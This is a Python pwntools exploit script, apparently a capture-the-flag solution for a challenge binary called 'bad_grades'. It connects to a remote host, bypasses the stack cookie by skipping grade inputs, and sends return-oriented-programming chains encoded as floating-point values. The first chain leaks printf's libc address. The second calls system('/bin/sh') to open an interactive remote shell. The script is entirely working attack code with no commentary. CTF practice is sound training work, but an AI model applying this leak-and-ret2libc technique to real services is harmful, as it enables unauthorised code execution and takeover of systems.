from pwn import *
import struct

def DecimalToFloat(value):
    FloatValue = struct.unpack('!d', value.to_bytes(8))[0]
    return (FloatValue)

Elf        = context.binary = ELF('./bad_grades')
Libc       = ELF('./libc.so.6')
Process    = remote('94.237.63.93', 58426)
Rop        = ROP('./bad_grades')

Gadget_pop_rdi = Rop.find_gadget(['pop rdi', 'ret'])[0]
Gadget_ret     = Rop.find_gadget(['ret'])[0]

PrintfGOT   = 0x601FC0
PutsPLT     = 0x400680
FunctionBOF = 0x401108


chain    = [
                DecimalToFloat(Gadget_ret),
                DecimalToFloat(Gadget_pop_rdi),
                DecimalToFloat(PrintfGOT),
                DecimalToFloat(PutsPLT),
                DecimalToFloat(Gadget_ret),
                DecimalToFloat(FunctionBOF)
            ]

Process.sendlineafter(b'> ', b'2') 
Process.sendlineafter(b'Number of grades: ', b'41')


# Skipping stack cookie and RBP
for i in range(35):                 
    print(Process.recv().decode('utf-8'))
    Process.sendline(b'+')


for value in chain:
    Process.recv()
    Process.sendline(str(value).encode())


Process.recvline()
PrintfProc = u64(Process.recvline()[:-1] + b'\x00' * 2)

LibcBase   = PrintfProc - Libc.sym.printf
shell      = LibcBase + next(Libc.search(b'/bin/sh'))
system     = LibcBase + Libc.sym.system

chain    = [
                DecimalToFloat(Gadget_pop_rdi),
                DecimalToFloat(shell),
                DecimalToFloat(Gadget_ret),
                DecimalToFloat(system)
            ]

Process.sendlineafter(b'> ', b'2') 
Process.sendlineafter(b'Number of grades: ', b'39')

for i in range(35):                 
    print(Process.recv().decode('utf-8'))
    Process.sendline(b'+')


for value in chain:
    Process.recv()
    Process.sendline(str(value).encode())

Process.interactive()